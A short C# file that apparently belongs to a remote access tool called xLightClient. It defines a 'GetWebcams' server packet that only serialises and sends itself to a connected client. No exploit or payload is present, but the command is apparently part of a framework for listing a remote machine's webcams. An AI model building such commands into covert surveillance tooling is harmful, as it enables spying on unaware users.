using System;
using xLightClient.Core.Networking;

namespace xLightClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetWebcams : IPacket
    {
        public GetWebcams()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}